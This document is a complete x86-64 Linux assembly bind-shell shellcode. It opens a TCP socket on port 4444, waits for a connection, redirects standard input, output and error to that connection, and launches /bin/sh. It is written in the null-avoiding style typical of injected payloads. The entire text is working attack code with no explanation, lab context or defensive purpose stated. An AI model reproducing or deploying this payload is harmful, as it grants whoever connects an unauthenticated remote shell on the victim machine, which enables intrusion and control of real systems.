; s = socket(2, 1, 0)
xor	rax, rax
cdq
xor	rdi, rdi
xor	rsi, rsi
mov	dil, 0x2
inc	rsi
mov	al, 0x29
syscall

; save socket's file discripter
xchg	r10, rax

; bind(s, [2, 4444 , 0], 16)
xor	rax, rax
mov	rdi, r10
push	rax
mov	byte [rsp], 0x2
mov	word [rsp+0x2], 0x5c11
push	rsp
pop	rsi
mov	dl, 0x10
mov	al, 0x31
syscall

; listen(s, 0)
xor	rax, rax
mov	rdi, r10
xor	rsi, rsi
mov	al, 0x32
syscall

; c = accept(s, 0, 0)
xor     rax, rax
mov     rdi, r10
xor     rsi, rsi
xor	rdx, rdx
mov     al, 0x2b
syscall

mov	r9, rax

; dup2(c, 0)
xor     rax, rax
mov	rdi, r9
xor	rsi, rsi
mov	al, 0x21
syscall

; dup2(c, 1)
xor     rax, rax
mov     al, 0x21
inc	rsi
syscall

; dup2(c, 2)
xor     rax, rax
mov     al, 0x21
inc     rsi
syscall

; execve("/bin/sh", ["/bin/sh", NULL], [NULL])
xor	rax, rax
cdq
push	rax
mov	rbx, 0x68732f2f6e69622f
push	rbx
push	rsp
pop	rdi
push	rdx
push	rdi
push	rsp
pop	rsi
mov	al, 0x3b
syscall
